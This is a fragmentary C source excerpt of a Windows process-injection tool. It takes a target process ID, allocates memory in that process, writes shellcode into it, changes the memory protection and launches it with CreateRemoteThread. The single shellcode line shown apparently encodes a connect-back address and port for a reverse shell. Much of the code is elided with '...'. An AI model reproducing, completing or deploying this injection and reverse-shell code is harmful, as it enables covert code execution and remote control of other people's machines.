...
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x1f\x95\xc0\xa8\x74\x82"
...
int main (int argc, char** argv) {
    ...
    if (argc != 2) 
    {
        printf("[-] Usage: %s <target_process id>", argv[0]);
        goto EXIT; 
    }
    ...
    // allocate Virutal memory on the target process 
    ...
    // write shell code to allocated memory 
    ...
    // change the protection of target process 
    ...
    hTargetThread = CreateRemoteThread(
        ...
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)uiAllocAddress,
        NULL,
        0,
        &dwThreadId
    );
    ...
    printf("[+] Create a remote thread sucess\n");
